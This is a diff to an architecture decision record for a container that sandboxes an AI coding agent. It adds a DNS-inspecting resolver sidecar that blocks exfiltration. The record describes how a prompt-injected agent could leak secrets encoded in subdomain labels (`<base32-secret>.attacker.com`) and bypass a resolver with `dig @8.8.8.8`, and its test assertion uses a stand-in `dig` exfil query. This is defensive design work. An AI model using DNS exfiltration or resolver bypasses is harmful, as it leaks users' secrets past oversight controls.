@@ -221,6 +221,37 @@ Other non-HTTP (SMTP, arbitrary ports) remains out of scope. Same reasoning as t
 
 **Test assertion (ADR-013 P3, evolved):** positive iptables-rule check that the active rule set covers (a) TCP 80/443 redirect to proxy, (b) TCP 22 refuse for non-whitelisted hosts, (c) UDP/443 drop. Documents the evolved policy in code.
 
+### D9: DNS inspected by a Python resolver sidecar (transparent port-53 REDIRECT)
+
+**Firmness: FIRM**
+
+**Added 2026-05-27 per [ADR-024](ADR-024-prompt-injection-threat-model.md) D4.** ADR-024 D4 names DNS as a first-class egress/exfil surface; this decision is its mechanism home. DNS exfil is the canonical hole the HTTP egress layer (D1–D8) cannot see: an injection-affected agent encodes data into subdomain labels (`<base32-secret>.attacker.com`) or fans out high-cardinality queries against one apex. The data leaves in the *query itself* — resolution succeeds before any HTTP connection is attempted, so the host whitelist and block mode (which gate the subsequent TCP/HTTP connection) never fire. ~100 bytes/query, near-undetectable without DNS-layer inspection; documented as a Claude Code vector (auto-approved `ping`/`dig`).
+
+**Current decision:** a small Python DNS resolver sidecar runs inside the container as the `rip-proxy` user — same user, fail-closed posture, shared rules source, and JSONL denial log as the mitmproxy egress addon (`rip_cage_egress.py`). iptables REDIRECTs UDP **and** TCP port 53 from non-`rip-proxy` UIDs to the local resolver, mirroring the existing TCP 80/443 REDIRECT (D2). The redirect is transparent: `dig @8.8.8.8 evil.com`, `nslookup`, `ping`, and `host` are all captured regardless of the upstream resolver the caller names — the agent cannot bypass by hardcoding a resolver IP.
+
+The resolver applies the exfil-shape heuristic only to **non-whitelisted apex domains** (apex not in `network.allowed_hosts`): refuse queries matching (a) subdomain label length exceeding an encoding-shape threshold, OR (b) cardinality exceeding a per-second threshold against a single apex. Whitelisted apexes pass unconditionally (a trusted host is a trusted query). Clean queries are forwarded upstream. The specific thresholds are implementation detail (tunable); the design contract is binary refusal for matched shapes, not rate-shaping.
+
+- **Fail-closed:** if the resolver cannot start or load rules, DNS resolution fails — same posture as the egress proxy today (per [ADR-001](ADR-001-fail-loud-pattern.md)). The agent surfaces the failure loudly rather than routing around it.
+- **Mode-aware:** DNS exfil refusal honors observe/block mode like every other egress layer (observe = log "would-have-blocked" to the JSONL egress log; block = refuse). It is not an always-on hard wall that ignores the observe-mode-first adoption ramp (D1 evolved).
+- **Shared allowlist:** the apex-whitelist check reads the same `network.allowed_hosts` source as the HTTP egress layer; denial records use the same JSONL log and the structured-stderr field contract the broader epic ships.
+
+**Rationale:**
+
+The contract is a custom heuristic (subdomain-length, per-apex cardinality) that no off-the-shelf resolver implements natively — any choice ends up carrying a custom filter regardless. A Python sidecar mirroring the existing mitmproxy addon gives one mental model (transparent intercept + sidecar inspector + shared rules + fail-closed + JSONL log), full control over the heuristic, and no resolver-hardcode bypass. Transparent REDIRECT (vs `resolv.conf` pointing at `127.0.0.1`) is what closes the `dig @8.8.8.8` hole.
+
+**Alternatives considered:**
+
+| Approach | Pros | Cons |
+|---|---|---|
+| **Python resolver sidecar + iptables REDIRECT port 53 (this decision)** | Architectural symmetry with the mitmproxy addon; full control over the custom heuristic; no resolver-hardcode bypass | A new always-running sidecar component to maintain |
+| Off-the-shelf resolver (dnsmasq / CoreDNS) + custom filter | Mature resolver core | `reasoned:` rejected — adds a second runtime while the exfil heuristic is still custom; carries both the resolver and the filter; breaks single-mental-model symmetry with the mitmproxy sidecar |
+| `resolv.conf` → `127.0.0.1`, no iptables REDIRECT | Simplest wiring | `reasoned:` rejected — agent can `dig @8.8.8.8` straight past it; a bypass hole that fails the threat model unless iptables blocking is also added, which lands back at the REDIRECT work without its transparency |
+| Acknowledge DNS exfil not-closed (no inspection) | Zero new components | `external:` rejected — ADR-024 D4 names DNS first-class in scope; documented Claude Code vector; the HTTP layer provably cannot see query-embedded exfil |
+
+**What would invalidate this:** if the subdomain-length / cardinality heuristic produces a high false-positive rate on legitimate dev workflows (e.g., npm/CDN hosts with long subdomain labels) at any defensible tightness, the layer's approach is wrong — DNS exfil would be acknowledged-not-closed (parallel to ADR-024's residual-risk acknowledgments) rather than enforced. Resolution path is to tighten the pattern definition (label-length cutoffs, cardinality windows, character classes), not to switch the contract from binary refusal to rate-shaping.
+
+**Test assertion:** `dig <long-encoded-label>.attacker.com` from inside a block-mode cage is refused at the resolver; the same query against a whitelisted apex resolves; in observe mode the query resolves but a "would-have-blocked" record lands in the JSONL egress log.
+
 ## Related
 
 - [Design doc: 2026-04-20 egress firewall](../2026-04-20-egress-firewall-design.md) — full architecture and implementation notes
@@ -229,3 +260,6 @@ Other non-HTTP (SMTP, arbitrary ports) remains out of scope. Same reasoning as t
 - Beads `rip-cage-2py` — tracking issue
 - [Anthropic enterprise network config](https://code.claude.com/docs/en/network-config) — `NODE_EXTRA_CA_CERTS` / `CLAUDE_CODE_CERT_STORE` support
 - [MITRE T1567.004](https://attack.mitre.org/techniques/T1567/004/) — Exfiltration over Webhook
+- [ADR-024: Prompt-injection threat model](ADR-024-prompt-injection-threat-model.md) D1 (threat class), D4 (DNS as first-class egress surface — D9 is its mechanism home)
+- [ADR-001: Fail-loud pattern](ADR-001-fail-loud-pattern.md) — fail-closed resolver posture (D9)
+- [MITRE T1071.004](https://attack.mitre.org/techniques/T1071/004/) — DNS as C2/exfil channel (D9 grounding)
